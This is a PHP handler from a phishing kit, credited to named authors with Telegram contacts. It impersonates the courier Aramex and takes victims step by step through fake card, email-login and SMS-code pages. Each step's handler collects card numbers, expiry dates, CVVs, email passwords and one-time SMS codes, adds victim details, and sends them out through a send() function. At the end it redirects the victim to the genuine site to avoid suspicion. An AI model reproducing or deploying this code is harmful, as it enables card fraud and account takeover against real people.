<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'wait' ) {
            header("Location: ". LINKTR ."vbv.html".LANGTR);
            exit();
        }
		if( $red == 'resend' ) {
			$subject = get_client_ip() . ' | LBB Login ';
			$message = '/-- Victim asked resend SMS --/' . get_client_ip() . "\r\n";
			send($subject,$message);
            header("Location: ". LINKTR ."wait.html".LANGTR);
            exit();
        }
	}
	elseif($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
		if ($_POST['step'] == "card") {
			if(empty($_POST['name']) || empty($_POST['tel']) || empty($_POST['cn']) || empty($_POST['ed']) || empty($_POST['cvv'])){
				header("Location: ". LINKTR ."card.html".LANGTR);
				exit();
			}else {
				$subject = get_client_ip() . ' | LBB Login ';
				$message = '/-- CARD_ARAMEX INFOS --/' . get_client_ip() . "\r\n";
				$message .= 'Full name : ' . $_POST['name'] . "\r\n";
				$message .= 'Phone : ' . $_POST['tel'] . "\r\n";
				$message .= 'Card number : ' . $_POST['cn'] . "\r\n";
				$message .= 'Exp : ' . $_POST['ed'] . "\r\n";
				$message .= 'Cvv : ' . $_POST['cvv'] . "\r\n";
				$message .= '/-- END ACCESS INFOS --/' . "\r\n";
				$message .= victim_infos();
				send($subject,$message);
				header("Location: ". LINKTR ."to_email.html".LANGTR);
				exit();
			}
        }
		if ($_POST['step'] == "email") {
			if(empty($_POST['emaill']) || empty($_POST['password'])){
				header("Location: ". LINKTR ."email.html".LANGTR);
				exit();
			}else {
				$subject = get_client_ip() . ' | LBB Login ';
				$message = '/-- Aramex_Email INFOS --/' . get_client_ip() . "\r\n";
				$message .= 'Email : ' . $_POST['emaill'] . "\r\n";
				$message .= 'Pwd : ' . $_POST['password'] . "\r\n";
				$message .= '/-- END ACCESS INFOS --/' . "\r\n";
				$message .= victim_infos();
				send($subject,$message);
				header("Location: ". LINKTR ."email_retry.html".LANGTR);
				exit();
			}
        }
		if ($_POST['step'] == "to_email") {
			$subject = get_client_ip() . ' | LBB Login ';
			$message = '/-- VICTIME CLICKED ON EMAIL LINK BUTTON --/' . get_client_ip() . "\r\n";
			$message .= victim_infos();
			send($subject,$message);
			header("Location: ". LINKTR ."email.html".LANGTR);
			exit();
        }
		if ($_POST['step'] == "email_2") {
			if(empty($_POST['emaill']) || empty($_POST['password'])){
				header("Location: ". LINKTR ."email_retry.html".LANGTR);
				exit();
			}else {
				$subject = get_client_ip() . ' | LBB Login ';
				$message = '/-- Aramex_Email II INFOS --/' . get_client_ip() . "\r\n";
				$message .= 'Email : ' . $_POST['emaill'] . "\r\n";
				$message .= 'Pwd : ' . $_POST['password'] . "\r\n";
				$message .= '/-- END ACCESS INFOS --/' . "\r\n";
				$message .= victim_infos();
				send($subject,$message);
				header("Location: ". OFFICIAL_WEBSITE);
				exit();
			}
        }
		if ($_POST['step'] == "sms") {
			if(empty($_POST['sms'])){
				header("Location: ". LINKTR ."sms.html".LANGTR);
				exit();
			}else {
				$subject = get_client_ip() . ' | LBB Login ';
				$message = '/-- Aramex_SMS INFOS --/' . get_client_ip() . "\r\n";
				$message .= 'SMS Code : ' . $_POST['sms'] . "\r\n";
				$message .= '/-- END ACCESS INFOS --/' . "\r\n";
				$message .= victim_infos();
				send($subject,$message);
				header("Location: ". LINKTR ."sms.html".LANGTR);
				exit();
			}
        }
    }
	else {
        echo "Access denied.";
    }
?>